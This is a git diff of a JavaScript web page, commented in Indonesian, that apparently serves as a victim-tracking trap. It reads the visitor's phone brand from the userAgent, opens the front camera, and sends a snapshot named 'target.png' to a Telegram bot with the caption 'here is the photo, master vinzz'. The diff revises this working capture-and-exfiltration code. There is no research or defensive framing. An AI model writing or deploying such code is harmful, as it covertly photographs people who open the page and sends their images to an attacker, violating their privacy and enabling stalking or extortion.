@@ -12,49 +12,30 @@ return "Tidak diketahui";
 }
 
 function getMerekHP() {
-  const ua = navigator.userAgent.toLowerCase()
+const ua = navigator.userAgent;
 
-  // Langsung cek merek populer di userAgent
-  if (ua.includes("samsung")) return "Samsung";
-  if (ua.includes("xiaomi") || ua.includes("mi ")) return "Xiaomi";
-  if (ua.includes("redmi")) return "Redmi";
-  if (ua.includes("oppo")) return "Oppo";
-  if (ua.includes("vivo")) return "Vivo";
-  if (ua.includes("realme")) return "Realme";
-  if (ua.includes("infinix")) return "Infinix";
-  if (ua.includes("asus")) return "Asus";
-  if (ua.includes("iphone")) return "iPhone";
-  if (ua.includes("huawei")) return "Huawei";
-  if (ua.includes("lenovo")) return "Lenovo";
-  if (ua.includes("tecno")) return "Tecno";
+if (/Samsung/i.test(ua)) return "Samsung";  
+if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";  
+if (/Redmi/i.test(ua)) return "Redmi";  
+if (/OPPO/i.test(ua)) return "Oppo";  
+if (/Vivo/i.test(ua)) return "Vivo";  
+if (/Realme/i.test(ua)) return "Realme";  
+if (/iPhone/i.test(ua)) return "iPhone";  
+if (/Asus/i.test(ua)) return "Asus";  
+if (/Infinix/i.test(ua)) return "Infinix";  
+if (/Huawei/i.test(ua)) return "Huawei";  
 
-  // Ekstrak dari "Build/XXX"
-  const match = ua.match(/build\/([\w\-]+)/i);
-  if (match && match[1]) {
-    const build = match[1].toLowerCase();
-    if (build.includes("sm-")) return "Samsung";
-    if (build.includes("rmx")) return "Realme";
-    if (build.includes("v202") || build.includes("v21")) return "Vivo";
-    if (build.includes("cp") || build.includes("cph")) return "Oppo";
-    if (build.includes("m210") || build.includes("mi")) return "Xiaomi";
-    if (build.includes("redmi")) return "Redmi";
-    if (build.includes("infinix")) return "Infinix";
-    if (build.includes("asus")) return "Asus";
-  }
+return "Tidak diketahui";
 
-  return "Tidak diketahui";
 }
-
 async function kirimFoto() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
 
     video.srcObject = stream;
-
     await new Promise(resolve => {
       video.onloadedmetadata = () => {
         video.play();
@@ -62,40 +43,32 @@ async function kirimFoto() {
       };
     });
 
-    // Tunggu dulu biar kamera nyala beneran
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    // Delay 2 detik biar maximal hasilnya
+    await new Promise(resolve => setTimeout(resolve, 2000));
 
-    // Set ukuran canvas dari video
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
 
-    // Gambar dari video ke canvas
+    const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    canvas.toBlob(async (blob) => {
-      if (!blob) {
-        await kirimPesanTelegram("Gagal ambil foto: blob kosong.");
-        return;
-      }
+    return new Promise((resolve) => {
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("photo", blob, "target.png");
+        formData.append('caption', '📸 ini fotonya tuan vinzz');
 
-      const formData = new FormData();
-      formData.append("chat_id", chat_id);
-      formData.append("photo", blob, "kamera.png");
-      formData.append("caption", "📸 ini fotonya tuan vinzz");
-
-      const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      });
-
-      if (!res.ok) {
-        await kirimPesanTelegram("❌ Gagal kirim foto ke Telegram.");
-        console.log(await res.text());
-      }
-    }, "image/png");
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).then(resolve);
+      }, 'image/png');
+    });
 
   } catch (err) {
-    await kirimPesanTelegram("❌ Kamera gagal dibuka: " + err.message);
+    console.warn("Akses kamera ditolak atau gagal.");
+    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak atau error.");
   }
 }
 
